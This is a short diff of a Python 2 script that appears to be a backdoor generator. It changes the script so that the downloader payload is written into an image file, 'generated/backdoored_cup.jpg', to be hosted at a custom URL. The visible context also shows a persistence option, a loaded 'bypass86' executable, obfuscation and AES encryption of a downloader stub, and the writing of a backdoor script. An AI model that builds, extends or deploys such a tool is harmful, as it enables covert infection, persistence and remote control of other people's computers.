@@ -132,6 +132,9 @@ if args.persistence:
 else:
 	persistpart = ' '
 
+if not os.path.isdir('generated'):
+	os.makedirs('generated')
+
 with open('base64/86', 'rb') as exe86:
 	bypass86 = "bypass86exe = '%s'" % (exe86.read())
 
@@ -178,9 +181,9 @@ if not args.customurl:
 	os.remove('cup.jpg')
 	dlf = 'stubs/downloader.py'
 else:
-	with open('code.txt', 'wb') as lf:
+	with open('generated/backdoored_cup.jpg', 'wb') as lf:
 		lf.write(downpayload)
-	print ' [V] Payload code written to code.txt'
+	print ' [V] Payload code written to generated/backdoored_cup.jpg'
 	print ' [V] Expecting it to be hosted at ' + args.customurl
 	downurl = args.customurl
 	dlf = 'stubs/downloader_cust.py'
@@ -194,8 +197,6 @@ downloaderscript = obstime.stdout.read()
 os.remove('tempobfs.py')
 cipher = AES.new(key2)
 downloader = EncodeAES(cipher, downloaderscript)
-if not os.path.isdir('generated'):
-	os.makedirs('generated')
 
 with open(backdoorName, 'w') as f:
 	f.write('#!/usr/bin/env python\nimport ')
